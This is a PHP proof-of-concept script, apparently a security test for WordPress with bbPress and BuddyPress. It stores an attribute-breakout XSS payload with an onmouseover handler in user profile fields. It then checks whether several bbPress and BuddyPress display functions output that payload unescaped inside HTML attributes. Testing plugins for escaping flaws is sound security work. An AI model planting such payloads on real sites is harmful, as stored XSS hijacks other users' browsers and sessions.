<?php
error_reporting(E_ERROR|E_PARSE);
$P = 'x" onmouseover=alert(1) z="';
$sub = get_user_by('login','subscriber');
// Store the breakout payload in display_name via the REAL save filters.
kses_remove_filters(); kses_init_filters();
wp_update_user(array('ID'=>$sub->ID,'display_name'=>$P,'first_name'=>$P,'nickname'=>$P));
$u = get_user_by('id',$sub->ID);
$out=array();
$out['_stored_display_name'] = $u->display_name;
// bbPress displayed-user field (used as title="..." in user-details.php)
bbpress()->displayed_user = $u;
$out['bbp_display_name_display'] = '<a title="'.bbp_get_displayed_user_field('display_name','display').'">x</a>';
$out['bbp_display_name_edit']    = '<input value="'.bbp_get_displayed_user_field('display_name','edit').'">';
$out['bbp_first_name_edit']      = '<input value="'.bbp_get_displayed_user_field('first_name','edit').'">';
// bbPress anonymous author fields rendered into form values
$out['bbp_author_display_name']  = '<input value="'.bbp_get_author_display_name().'">';
// bbPress topic title in edit form value
$out['bbp_form_topic_title']     = '<input value="'.bbp_get_form_topic_title().'">';
// BuddyPress: xprofile value + group name in attribute contexts
$fid = bp_xprofile_fullname_field_id();
xprofile_set_field_data($fid,$sub->ID,wp_slash($P));
$out['bp_member_name_attr']      = '<a title="'.bp_core_get_user_displayname($sub->ID).'">x</a>';
$out['bp_xprofile_value_attr']   = '<span data-x="'.xprofile_get_field_data($fid,$sub->ID).'">x</span>';
echo json_encode($out);
